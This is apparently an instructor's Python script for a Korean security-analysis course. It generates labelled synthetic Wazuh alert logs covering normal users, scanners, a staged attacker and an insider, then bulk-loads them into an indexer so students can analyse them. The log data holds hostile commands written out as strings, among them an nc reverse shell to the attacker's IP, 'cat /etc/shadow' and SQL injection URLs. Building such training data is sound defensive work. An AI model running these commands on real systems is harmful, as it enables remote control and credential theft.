#!/usr/bin/env python3
"""kt66 고급 실습용 합성 로그 생성기 (강사 사전 준비 도구).

90일치 '알림 문서'를 Wazuh 알림과 같은 구조로 만들어 인덱서에 넣는다. 학생은 이 데이터를
Discover · Visualize · Dev Tools 에서 직접 검색·집계해 IP·이벤트·시간 축 위험을 따진다.
정답 라벨(synthetic.actor / campaign / stage)이 들어 있어 학생 결과를 채점할 수 있다.

  python3 kt66_synth.py --days 90 --out synth.ndjson                 # 파일로만
  python3 kt66_synth.py --days 90 --push https://10.20.32.110:9200 \\
          --user admin --password '…' --insecure                     # 인덱서에 적재
  python3 kt66_synth.py --delete --push … --user … --password … --insecure   # 합성 데이터만 삭제

행위자 4부류: normal(정상 사용자·관리자·헬스체크), scanner(주기적 스캔), attacker(정찰→침해→지속화
→C2→흔적 삭제), insider(내부자). 실제 Wazuh 는 레벨 0 정상 접근(31100)을 인덱싱하지 않지만,
'접근 일수'를 셀 수 있도록 합성 데이터는 31100 을 레벨 3 으로 넣는다.
"""
import argparse, base64, datetime as dt, ipaddress, json, random, ssl, sys, urllib.request

KST = dt.timezone(dt.timedelta(hours=9))
HOLIDAYS = {"2026-08-15", "2026-09-24", "2026-09-25", "2026-09-26", "2026-10-03", "2026-10-09"}
COUNTRIES = {"KR": "South Korea", "US": "United States", "CN": "China", "RU": "Russia", "NL": "Netherlands",
             "DE": "Germany", "VN": "Vietnam", "BR": "Brazil", "IN": "India", "SC": "Seychelles"}
MITRE = {"T1595": "Reconnaissance", "T1190": "Initial Access", "T1110": "Credential Access",
         "T1078": "Initial Access", "T1548.003": "Privilege Escalation", "T1136.001": "Persistence",
         "T1098.004": "Persistence", "T1053.003": "Persistence", "T1059.004": "Execution",
         "T1070.003": "Defense Evasion", "T1046": "Discovery"}
AGENTS = {"web": "002", "fw": "004", "ips": "001", "bastion": "006", "siem": "000"}

def rule(rid, level, desc, groups, mitre=None):
    r = {"id": str(rid), "level": level, "description": desc, "groups": groups}
    if mitre:
        r["mitre"] = {"id": [mitre], "tactic": [MITRE[mitre]], "technique": [desc]}
    return r

R = {
 "web_ok":   rule(31100, 3, "Access log messages grouped.", ["web", "accesslog"]),
 "web_400":  rule(31101, 5, "Web server 400 error code.", ["web", "accesslog", "attack"]),
 "web_scan": rule(31151, 10, "Multiple web server 400 error codes from same source ip.", ["web", "accesslog", "web_scan", "recon"], "T1595"),
 "sqli":     rule(31103, 6, "SQL injection attempt.", ["web", "accesslog", "attack", "sql_injection"], "T1190"),
 "ok200":    rule(31106, 12, "A web attack returned code 200 (success).", ["web", "accesslog", "attack"], "T1190"),
 "fw_drop":  rule(4101, 5, "Firewall drop event.", ["firewall", "firewall_drop"], "T1046"),
 "fw_multi": rule(4151, 10, "Multiple Firewall drop events from same source.", ["firewall", "multiple_drops"], "T1046"),
 "ips_scan": rule(86601, 6, "Suricata: Alert - KT66 Possible nmap SYN scan", ["ids", "suricata"], "T1046"),
 "ips_rev":  rule(86601, 10, "Suricata: Alert - ET ATTACK_RESPONSE Possible Reverse Shell", ["ids", "suricata"], "T1059.004"),
 "ssh_inv":  rule(5710, 5, "sshd: Attempt to login using a non-existent user", ["syslog", "sshd", "authentication_failed", "invalid_login"], "T1110"),
 "ssh_fail": rule(5716, 5, "sshd: authentication failed.", ["syslog", "sshd", "authentication_failed"], "T1110"),
 "ssh_brute": rule(5712, 10, "sshd: brute force trying to get access to the system. Non existent user.", ["syslog", "sshd", "authentication_failures"], "T1110"),
 "ssh_ok":   rule(5715, 3, "sshd: authentication success.", ["syslog", "sshd", "authentication_success"], "T1078"),
 "sudo":     rule(5402, 3, "Successful sudo to ROOT executed.", ["syslog", "sudo"], "T1548.003"),
 "useradd":  rule(5902, 8, "New user added to the system.", ["syslog", "adduser"], "T1136.001"),
 "fim_add":  rule(554, 5, "File added to the system.", ["ossec", "syscheck", "syscheck_entry_added", "syscheck_file"], "T1098.004"),
 "fim_mod":  rule(550, 7, "Integrity checksum changed.", ["ossec", "syscheck", "syscheck_entry_modified", "syscheck_file"]),
 "fim_del":  rule(553, 7, "File deleted.", ["ossec", "syscheck", "syscheck_entry_deleted", "syscheck_file"], "T1070.003"),
 "cmd":      rule(100260, 3, "kt66 shell command", ["cmdlog"]),
 "cmd_bad":  rule(100261, 10, "kt66 suspicious shell command", ["cmdlog", "attack"], "T1059.004"),
}

class Gen:
    def __init__(self, days, scale, seed):
        self.rnd = random.Random(seed); self.days = days; self.scale = scale
        self.end = dt.datetime.now(KST).replace(minute=0, second=0, microsecond=0)
        self.start = self.end - dt.timedelta(days=days)
        self.docs = []

    # ── 도우미
    def t(self, day, hour=None, minute=None):
        h = self.rnd.randint(0, 23) if hour is None else hour
        m = self.rnd.randint(0, 59) if minute is None else minute
        return (self.start + dt.timedelta(days=day)).replace(hour=h % 24, minute=m, second=self.rnd.randint(0, 59))
    def ip(self, net):
        n = ipaddress.ip_network(net); return str(n[self.rnd.randint(1, n.num_addresses - 2)])
    def emit(self, when, key, agent, actor, data, full_log, campaign=None, stage=None, rep=0, cc="KR", host=None):
        r = dict(R[key]); src = data.get("srcip") or data.get("src_ip")
        d = {"timestamp": when.astimezone(dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
             "rule": r, "agent": {"id": AGENTS[agent], "name": agent}, "manager": {"name": "wazuh.manager"},
             "decoder": {"name": data.pop("_decoder", "web-accesslog")}, "data": data, "full_log": full_log,
             "location": data.pop("_location", "/var/log/apache2/access.log"),
             "synthetic": {"flag": True, "actor": actor, "campaign": campaign or actor, "stage": stage or "none"}}
        if src and not ipaddress.ip_address(src).is_private:
            d["GeoLocation"] = {"country_name": COUNTRIES[cc]}
        if src: d["data"]["ip_reputation"] = rep
        if host: d["predecoder"] = {"hostname": host, "program_name": "sshd"}
        self.docs.append(d)
    def web(self, when, actor, ip, url, code, key, cc, rep, ua="Mozilla/5.0", campaign=None, stage=None):
        line = f'{ip} - - [{when.strftime("%d/%b/%Y:%H:%M:%S +0900")}] "GET {url} HTTP/1.1" {code} 512 "-" "{ua}"'
        self.emit(when, key, "web", actor, {"srcip": ip, "protocol": "GET", "url": url, "id": str(code)}, line,
                  campaign, stage, rep, cc)
    def ssh(self, when, actor, ip, key, user, cc, rep, campaign=None, stage=None):
        msg = {"ssh_inv": f"Failed password for invalid user {user} from {ip} port 4{self.rnd.randint(1000,9999)} ssh2",
               "ssh_fail": f"Failed password for {user} from {ip} port 4{self.rnd.randint(1000,9999)} ssh2",
               "ssh_brute": f"Failed password for invalid user {user} from {ip} port 4{self.rnd.randint(1000,9999)} ssh2",
               "ssh_ok": f"Accepted password for {user} from {ip} port 4{self.rnd.randint(1000,9999)} ssh2"}[key]
        line = f'{when.strftime("%b %d %H:%M:%S")} bastion sshd[{self.rnd.randint(1000,9999)}]: {msg}'
        data = {"srcip": ip, ("dstuser" if key == "ssh_ok" else "srcuser"): user, "_decoder": "sshd", "_location": "/var/log/auth.log"}
        self.emit(when, key, "bastion", actor, data, line, campaign, stage, rep, cc, host="bastion")
    def fw(self, when, actor, ip, port, cc, rep, campaign=None, stage="recon"):
        line = f'{when.strftime("%b %d %H:%M:%S")} fw kernel: DROP IN=eth0 OUT= SRC={ip} DST=10.20.30.1 PROTO=TCP SPT=4{self.rnd.randint(1000,9999)} DPT={port}'
        self.emit(when, "fw_drop", "fw", actor, {"srcip": ip, "dstport": str(port), "action": "DROP", "_decoder": "iptables",
                  "_location": "/var/log/kern.log"}, line, campaign, stage, rep, cc)

    # ── 행위자
    def normal(self):
        n_ip = int(187 * self.scale) or 5
        for i in range(n_ip):
            kind = self.rnd.choice(["user"] * 5 + ["kr"] * 3 + ["partner"])
            ip, cc = (self.ip("10.20.70.0/24"), "KR") if kind == "user" else \
                     (self.ip("211.0.0.0/8"), "KR") if kind == "kr" else (self.ip("104.16.0.0/12"), "US")
            for day in range(self.days):
                if (self.start + dt.timedelta(days=day)).weekday() >= 5 and self.rnd.random() < 0.8: continue
                if self.rnd.random() < 0.55: continue
                for _ in range(self.rnd.randint(1, 4)):
                    hour = self.rnd.randint(9, 17) if kind != "partner" else self.rnd.choice([22, 23, 0, 1, 2, 3])
                    w = self.t(day, hour)
                    self.web(w, "normal", ip, self.rnd.choice(["/", "/products", "/api/cart", "/login", "/search?q=shoes"]), 200, "web_ok", cc, 0)
                    if self.rnd.random() < 0.03:
                        self.web(w, "normal", ip, "/favicon.icon", 404, "web_400", cc, 0)
        admin = "10.20.70.5"
        for day in range(self.days):
            if (self.start + dt.timedelta(days=day)).weekday() >= 5: continue
            w = self.t(day, self.rnd.randint(9, 11))
            if self.rnd.random() < 0.1:
                self.ssh(w, "normal", admin, "ssh_fail", "ccc", "KR", 0)
            self.ssh(w + dt.timedelta(minutes=1), "normal", admin, "ssh_ok", "ccc", "KR", 0)
            for c in ["apt update", "systemctl restart apache2"][: self.rnd.randint(1, 2)]:
                self.emit(w + dt.timedelta(minutes=3), "sudo", "bastion", "normal",
                          {"srcuser": "ccc", "dstuser": "root", "command": f"/usr/bin/{c}", "_decoder": "sudo", "_location": "/var/log/auth.log"},
                          f"bastion sudo: ccc : TTY=pts/0 ; PWD=/home/ccc ; USER=root ; COMMAND=/usr/bin/{c}", host="bastion")
            for h in range(0, 24, 2):   # 헬스체크: User-Agent 가 스캐너처럼 보이는 정상 모니터링
                self.web(self.t(day, h, 0), "normal", "10.20.32.60", "/health", 200, "web_ok", "KR", 0, ua="curl/7.81.0 (kt66-monitor)")

    def scanner(self):
        for i in range(int(40 * self.scale) or 3):
            cc = self.rnd.choice(["CN", "RU", "NL", "US", "VN", "BR", "IN", "SC"])
            ip = self.ip(self.rnd.choice(["45.0.0.0/8", "103.0.0.0/8", "118.0.0.0/8", "185.0.0.0/8", "193.0.0.0/8"]))
            rep = self.rnd.randint(35, 95); day = self.rnd.randint(0, 6)
            while day < self.days:
                base = self.t(day)
                for p in self.rnd.sample(range(1, 1024), self.rnd.randint(20, 60)):
                    self.fw(base + dt.timedelta(seconds=self.rnd.randint(0, 90)), "scanner", ip, p, cc, rep, f"scan-{i}")
                if self.rnd.random() < 0.6:
                    for _ in range(self.rnd.randint(15, 40)):
                        self.web(base + dt.timedelta(minutes=2, seconds=self.rnd.randint(0, 120)), "scanner", ip,
                                 self.rnd.choice(["/admin/", "/.env", "/wp-login.php", "/phpmyadmin/", "/backup.zip"]), 404,
                                 "web_400", cc, rep, ua="Mozilla/5.00 (Nikto/2.1.6)", campaign=f"scan-{i}", stage="recon")
                    self.web(base + dt.timedelta(minutes=5), "scanner", ip, "/admin/", 404, "web_scan", cc, rep, campaign=f"scan-{i}", stage="recon")
                if self.rnd.random() < 0.4:
                    for _ in range(self.rnd.randint(5, 15)):
                        self.web(base + dt.timedelta(minutes=8, seconds=self.rnd.randint(0, 60)), "scanner", ip,
                                 "/?id=1%27%20OR%201=1--", 403, "sqli", cc, rep, ua="sqlmap/1.7", campaign=f"scan-{i}", stage="exploit")
                if self.rnd.random() < 0.4:
                    for u in self.rnd.sample(["admin", "oracle", "test", "ubuntu", "pi", "guest"], 4):
                        self.ssh(base + dt.timedelta(minutes=12, seconds=self.rnd.randint(0, 50)), "scanner", ip, "ssh_inv", u, cc, rep, f"scan-{i}", "auth")
                    self.ssh(base + dt.timedelta(minutes=13), "scanner", ip, "ssh_brute", "admin", cc, rep, f"scan-{i}", "auth")
                day += self.rnd.randint(5, 12)

    def attacker(self):
        plans = [("185.220.158.180", "DE", 92, True), ("162.142.241.68", "US", 8, True), ("222.186.74.165", "CN", 88, True),
                 ("185.56.193.253", "NL", 76, False), ("118.123.50.105", "CN", 81, False)]
        for k, (ip, cc, rep, full) in enumerate(plans[: max(2, int(5 * self.scale) or 2)]):
            camp = f"apt-{k+1}"; day0 = self.rnd.randint(5, self.days - 25)
            biz = ip == "162.142.241.68"   # 업무시간에 섞여 들어오는 함정
            hr = lambda: self.rnd.randint(10, 16) if biz else self.rnd.choice([0, 1, 2, 3, 22, 23])
            for d in range(3):   # 정찰
                base = self.t(day0 + d, hr())
                for p in self.rnd.sample(range(1, 1024), 30): self.fw(base + dt.timedelta(seconds=self.rnd.randint(0, 60)), "attacker", ip, p, cc, rep, camp)
                self.fw(base, "attacker", ip, 22, cc, rep, camp); self.docs[-1]["rule"] = dict(R["fw_multi"])
                self.emit(base, "ips_scan", "ips", "attacker", {"src_ip": ip, "dest_ip": "10.20.30.1", "alert": {"signature": "KT66 Possible nmap SYN scan", "action": "allowed", "severity": 2}, "_decoder": "json", "_location": "/var/log/suricata/eve.json"},
                          json.dumps({"event_type": "alert", "src_ip": ip}), camp, "recon", rep, cc)
            base = self.t(day0 + 3, hr())   # 웹 공격
            for j in range(self.rnd.randint(20, 40)):
                self.web(base + dt.timedelta(seconds=j * 7), "attacker", ip, f"/rest/products/search?q=%27))%20UNION%20SELECT%20{j}--", 403, "sqli", cc, rep, campaign=camp, stage="exploit")
            for j in range(2):
                self.web(base + dt.timedelta(minutes=6, seconds=j), "attacker", ip, "/rest/products/search?q=%27))--", 200, "ok200", cc, rep, campaign=camp, stage="exploit")
            base = self.t(day0 + 4, hr())   # SSH 브루트포스 → 성공
            for j in range(self.rnd.randint(60, 160)):
                self.ssh(base + dt.timedelta(seconds=j * 2), "attacker", ip, "ssh_fail", "ccc", cc, rep, camp, "auth")
            self.ssh(base + dt.timedelta(minutes=6), "attacker", ip, "ssh_brute", "ccc", cc, rep, camp, "auth")
            if not full: continue   # 2명은 여기서 멈춤
            ok = base + dt.timedelta(minutes=19)
            self.ssh(ok, "attacker", ip, "ssh_ok", "ccc", cc, rep, camp, "access")
            steps = [("sudo", {"srcuser": "ccc", "dstuser": "root", "command": "/bin/bash"}, "bastion", "privesc"),
                     ("useradd", {"dstuser": "svc-backup"}, "bastion", "privesc"),
                     ("fim_add", {"_path": "/home/ccc/.ssh/authorized_keys"}, "web", "persist"),
                     ("fim_add", {"_path": "/etc/cron.d/sysupdate"}, "web", "persist"),
                     ("cmd_bad", {"command": f"nc -e /bin/bash {ip} 4444", "cmd_host": "bastion"}, "bastion", "c2"),
                     ("ips_rev", {"src_ip": "10.20.30.201", "dest_ip": ip, "alert": {"signature": "ET ATTACK_RESPONSE Possible Reverse Shell", "action": "allowed", "severity": 1}}, "ips", "c2"),
                     ("fim_del", {"_path": "/home/ccc/.bash_history"}, "web", "evasion")]
            for n, (key, data, agent, stage) in enumerate(steps):
                w = ok + dt.timedelta(minutes=2 + n * 3)
                p = data.pop("_path", None)
                if p:
                    self.emit(w, key, agent, "attacker", {"_decoder": "syscheck_new_entry", "_location": "syscheck"}, f"File '{p}' {key}", camp, stage, rep, cc)
                    self.docs[-1]["syscheck"] = {"path": p, "event": {"fim_add": "added", "fim_del": "deleted"}[key]}
                else:
                    self.emit(w, key, agent, "attacker", dict(data, _decoder="sshd", _location="/var/log/auth.log"), json.dumps(data), camp, stage, rep, cc)
            for d in self.rnd.sample(range(day0 + 5, min(self.days, day0 + 20)), 3):   # 며칠 재접속
                self.ssh(self.t(d, hr()), "attacker", ip, "ssh_ok", "ccc", cc, rep, camp, "access")

    def insider(self):
        ip = "10.20.70.23"
        for day in range(self.days):
            wd = (self.start + dt.timedelta(days=day)).weekday()
            if wd < 5:
                for _ in range(self.rnd.randint(2, 5)):
                    self.web(self.t(day, self.rnd.randint(9, 17)), "insider", ip, "/api/orders", 200, "web_ok", "KR", 0)
            if self.rnd.random() < 0.2:   # 주 1~2회 심야·휴일
                w = self.t(day, self.rnd.choice([1, 2, 3, 23]))
                self.ssh(w, "insider", ip, "ssh_ok", "ccc", "KR", 0, "insider", "access")
                self.emit(w + dt.timedelta(minutes=2), "sudo", "bastion", "insider", {"srcuser": "ccc", "dstuser": "root", "command": "/usr/bin/vi /etc/sudoers.d/ccc", "_decoder": "sudo", "_location": "/var/log/auth.log"},
                          "bastion sudo: ccc : COMMAND=/usr/bin/vi /etc/sudoers.d/ccc", "insider", "privesc", 0, "KR", host="bastion")
                self.emit(w + dt.timedelta(minutes=4), "fim_mod", "web", "insider", {"_decoder": "syscheck_integrity_changed", "_location": "syscheck"}, "File '/etc/sudoers.d/ccc' modified", "insider", "persist", 0)
                self.docs[-1]["syscheck"] = {"path": "/etc/sudoers.d/ccc", "event": "modified"}
                self.emit(w + dt.timedelta(minutes=6), "cmd_bad", "bastion", "insider", {"command": "cat /etc/shadow", "cmd_host": "bastion", "_decoder": "cmdlog", "_location": "cmdlog"}, "CMDKT66 cmd=cat /etc/shadow", "insider", "c2", 0)
                self.emit(w + dt.timedelta(minutes=8), "fim_del", "web", "insider", {"_decoder": "syscheck_deleted", "_location": "syscheck"}, "File '/var/log/auth.log' deleted", "insider", "evasion", 0)
                self.docs[-1]["syscheck"] = {"path": "/var/log/auth.log", "event": "deleted"}

    def run(self):
        self.normal(); self.scanner(); self.attacker(); self.insider()
        self.docs.sort(key=lambda d: d["timestamp"]); return self.docs

def push(docs, url, user, password, insecure, chunk=2000):
    ctx = ssl._create_unverified_context() if insecure else None
    auth = "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()
    sent = 0
    for i in range(0, len(docs), chunk):
        body = []
        for d in docs[i:i + chunk]:
            day = d["timestamp"][:10].replace("-", ".")
            body.append(json.dumps({"index": {"_index": f"wazuh-alerts-4.x-{day}"}})); body.append(json.dumps(d))
        req = urllib.request.Request(url.rstrip("/") + "/_bulk", ("\n".join(body) + "\n").encode(),
                                     {"Content-Type": "application/x-ndjson", "Authorization": auth})
        res = json.load(urllib.request.urlopen(req, context=ctx))
        if res.get("errors"):
            err = next(it for it in res["items"] if it["index"].get("error"))
            sys.exit(f"bulk 오류: {err['index']['error']}")
        sent += len(docs[i:i + chunk]); print(f"\r적재 {sent}/{len(docs)}", end="", flush=True)
    print()

def delete(url, user, password, insecure):
    ctx = ssl._create_unverified_context() if insecure else None
    auth = "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()
    req = urllib.request.Request(url.rstrip("/") + "/wazuh-alerts-4.x-*/_delete_by_query?refresh=true",
                                 json.dumps({"query": {"term": {"synthetic.flag": True}}}).encode(),
                                 {"Content-Type": "application/json", "Authorization": auth}, method="POST")
    print("삭제:", json.load(urllib.request.urlopen(req, context=ctx)).get("deleted"), "건")

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--days", type=int, default=90); ap.add_argument("--scale", type=float, default=1.0)
    ap.add_argument("--seed", type=int, default=66); ap.add_argument("--out")
    ap.add_argument("--push"); ap.add_argument("--user", default="admin"); ap.add_argument("--password")
    ap.add_argument("--insecure", action="store_true"); ap.add_argument("--delete", action="store_true")
    a = ap.parse_args()
    if a.delete:
        delete(a.push, a.user, a.password, a.insecure); sys.exit()
    docs = Gen(a.days, a.scale, a.seed).run()
    by = {}
    for d in docs: by[d["synthetic"]["actor"]] = by.get(d["synthetic"]["actor"], 0) + 1
    print(f"생성 {len(docs)}건", by)
    if a.out:
        with open(a.out, "w") as f:
            for d in docs: f.write(json.dumps(d, ensure_ascii=False) + "\n")
        print("파일:", a.out)
    if a.push: push(docs, a.push, a.user, a.password, a.insecure)
